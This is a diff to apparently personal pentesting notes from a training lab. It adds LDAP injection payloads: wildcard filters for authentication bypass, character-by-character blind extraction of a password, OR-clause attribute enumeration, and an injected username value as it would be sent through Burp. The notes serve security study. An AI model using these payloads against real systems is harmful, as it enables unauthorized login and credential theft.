@@ -149,9 +149,33 @@ xcat run http://172.17.0.2/index.php username username=admin -m POST --true-stri
 ### LDAP - Authentication Bypass
 
 Try various wildcards
-- `(&(uid=*)(userPassword=*))`
-- `(&(uid=admin*)(userPassword=*))`
-- `(&(uid=*admin*)(userPassword=*))`
+```bash
+(&(uid=*)(userPassword=*))
+(&(uid=admin*)(userPassword=*))
+(&(uid=*admin*)(userPassword=*))
+```
 
 Try or and
-- `(&(uid=admin)(|(&)(userPassword=abc)))` - a username of ``admin)(|(&` and a password of `abc)`
+- `(&(uid=admin)(|(&)(userPassword=abc)))` 
+- This would be a username of ``admin)(|(&` and a password of `abc)`
+
+### LDAP - Data Exfiltration & Blind Exploitation
+
+- When a response varies depending on whether a query is valid or not we can extract data by testing diferent chars one by one
+```bash
+(&(uid=htb-stdnt)(password=a*)) # invalid
+(&(uid=htb-stdnt)(password=p*)) # valid, move onto next and so on
+(&(uid=htb-stdnt)(password=pa*))
+(&(uid=htb-stdnt)(password=p@a*))
+```
+- We can than use the or clause to find other attibutes **NOTE** ldap attributes can be case insensitive
+```bash
+(&(uid=htb-stdnt)(|(description=a*)(password=invalid)))
+(&(uid=htb-stdnt)(|(description=da*)(password=invalid)))
+```
+- In burp this would be `username=htb-stdnt)(|(description=a*&password=Invalid)`
+- We can also determine valid attributes with the OR clause
+```bash
+(&(uid=htb-stdnt)(|(InvalidAttribute=*)(password=invalid)))
+(&(uid=htb-stdnt)(|(ValidAttribute=*)(password=invalid)))
+```
